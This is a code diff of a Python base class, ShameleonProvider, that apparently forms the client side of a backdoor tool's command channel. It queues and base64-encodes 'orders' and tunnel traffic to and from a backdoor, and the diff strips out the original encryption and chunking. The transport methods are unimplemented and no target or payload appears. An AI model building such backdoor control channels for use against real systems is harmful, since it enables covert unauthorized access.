@@ -1,15 +1,10 @@
-from __future__ import annotations
-
-import sys
+#!/bin/env python3
 import threading
 import time
-from pkgutil import iter_modules
+from base64 import b64decode
+from base64 import b64encode
 from queue import Queue
 from uuid import uuid4
-
-from cryptography.fernet import Fernet
-
-from shameleon_client.profile import Profile
 
 
 class ShameleonProvider(threading.Thread):
@@ -21,30 +16,25 @@ class ShameleonProvider(threading.Thread):
     specific providers.
     The ShameleonProvider class is a thread that will run in background.
     """
-    _PROVIDERS: dict[str, type[ShameleonProvider]] = {}
 
-    def __init__(self, profile: Profile):
+    def __init__(self):
         super().__init__()
-        self._profile = profile
-        self._crypto = Fernet(self._profile.backdoor_secret)
-        self._tunnels: dict[str, dict[str, Queue]] = {
+        self._tunnels = {
             'system': {'in': Queue(), 'out': Queue()},
-        }
-        self._buffers: dict[str, str] = {
-            'system': '',
         }
 
     def run(self):
         while True:
-            # Send chuncks
+            # Send data
             buffer: list[str] = []
             for _, streams in self._tunnels.items():
                 while not streams['out'].empty():
+
                     buffer.append(streams['out'].get(block=False))
             if len(buffer) > 0:
                 self._send_payload(buffer)
                 time.sleep(1)  # TODO: Humanize and use backdoor config
-            # Receive chuncks
+            # Receive data
             incoming = self._get_payload()
             if len(incoming) > 0:
                 for tunnel_id, data in incoming:
@@ -76,16 +66,14 @@ class ShameleonProvider(threading.Thread):
         content = f"{tunnel_type}:{tunnel_uuid}"
         self.send_data("system", content.encode('utf-8'))
         while True:
-            incomming = self.receive_data("system")
-            if len(incomming) == 0:
-                continue
-            decoded_data = incomming.decode('utf-8')
-            if decoded_data != 'OK':
-                raise Exception('Impossible to create tunnel: %s', decoded_data)
-            print("[i] tunnel ID:", tunnel_uuid)
-            self._tunnels[tunnel_uuid] = {'in': Queue(), 'out': Queue()}
-            self._buffers[tunnel_uuid] = ''
-            return tunnel_uuid
+            data = self.receive_data("system")
+            if len(data) > 0:
+                decoded_data = data.decode('utf-8')
+                if decoded_data != 'OK':
+                    raise Exception('Impossible to create tunnel: %s', decoded_data)
+                print("[i] tunnel ID:", tunnel_uuid)
+                self._tunnels[tunnel_uuid] = {'in': Queue(), 'out': Queue()}
+                return tunnel_uuid
 
     def send_data(self, tunnel_id: str, data: bytes):
         """ Send data to the backdoor.
@@ -97,12 +85,10 @@ class ShameleonProvider(threading.Thread):
             tunnel_id (str): Unique identifier of the tunnel
             data (bytes): Data to send to the backdoor
         """
-        # Encryption
-        encrypted_data = self._crypto.encrypt(data)
-        # Split data
-        for chunk in self._split_data(encrypted_data, tunnel_id):
-            packet = f"{tunnel_id}:{chunk.decode('utf-8')}"
-            self._tunnels[tunnel_id]['out'].put(packet)
+        header = f"{tunnel_id}:"
+        encoded_data = b64encode(data).decode('utf-8')
+        order = header + encoded_data
+        self._tunnels[tunnel_id]['out'].put(order)
 
     def receive_data(self, tunnel_id: str) -> bytes:
         """ Receive data from the backdoor.
@@ -116,17 +102,11 @@ class ShameleonProvider(threading.Thread):
         Returns:
             bytes: Data received from the backdoor
         """
-        data = b''
+        data: bytes = b''
         while not self._tunnels[tunnel_id]['in'].empty():
-            encrypted = self._tunnels[tunnel_id]['in'].get(block=False)
-            # Partial data
-            if encrypted[-1] == '!' and len(encrypted) == self._profile.packet_size - len(tunnel_id) + 1:
-                self._buffers[tunnel_id] += encrypted[:-1]
-                continue
-            encrypted = self._buffers[tunnel_id] + encrypted
-            decrypted = self._crypto.decrypt(encrypted.encode('utf-8'))
-            self._buffers[tunnel_id] = ''
-            data += decrypted
+            encoded = self._tunnels[tunnel_id]['in'].get(block=False)
+            decoded = b64decode(encoded.encode('utf-8'))
+            data += decoded
         return data
 
     def not_handled_data(self, tunnel_id: str, data: bytes):
@@ -139,19 +119,8 @@ class ShameleonProvider(threading.Thread):
             tunnel_id (str): Unique identifier of the tunnel
             data (bytes): data to put in the reception queue
         """
-        encrypted = self._crypto.encrypt(data)
-        self._tunnels[tunnel_id]['in'].put(encrypted)
-
-    def _split_data(self, data: bytes, tunel_id: str) -> list[bytes]:
-        if self._profile.packet_size == 0:
-            return [data]
-        header_len = len(tunel_id) + 1
-        if header_len + len(data) <= self._profile.packet_size:
-            return [data]
-        results: list[bytes] = []
-        for i in range(0, len(data), self._profile.packet_size - 1):
-            results.append(data[i:i + self._profile.packet_size - 1] + b'!')
-        return results
+        encoded = b64encode(data)
+        self._tunnels[tunnel_id]['in'].put(encoded)
 
     # Must be implemented
     def _send_payload(self, data: list[str]):
@@ -159,38 +128,3 @@ class ShameleonProvider(threading.Thread):
 
     def _get_payload(self) -> list[tuple[str, str]]:
         raise NotImplementedError()
-
-    # Following methods are helpers that can be used
-
-    @property
-    def base_class(self):
-        return self.__class__.__bases__[0].__name__
-
-    @classmethod
-    def _module_collection(cls):
-        return sys.modules[cls.__module__.rsplit('.', 1)[0]]
-
-    @classmethod
-    def _load_modules(cls):
-        for submodule in iter_modules(cls._module_collection().__path__):
-            if submodule.name in ('base',):
-                continue
-            module = __import__(
-                f"{cls._module_collection().__name__}.{submodule.name.lower()}",
-                fromlist=[''],
-            )
-            module_name = getattr(module, 'PROVIDER_NAME')
-            module_class = getattr(module, f"{module_name.title()}{cls.__name__}")
-            cls._PROVIDERS[module_name] = module_class
-
-    @classmethod
-    def available_modules(cls) -> list[type[ShameleonProvider]]:
-        if len(cls._PROVIDERS) == 0:
-            cls._load_modules()
-        return list(cls._PROVIDERS.values())
-
-    @classmethod
-    def get_module_from_name(cls, module_name) -> type[ShameleonProvider]:
-        if len(cls._PROVIDERS) == 0:
-            cls._load_modules()
-        return cls._PROVIDERS[module_name]
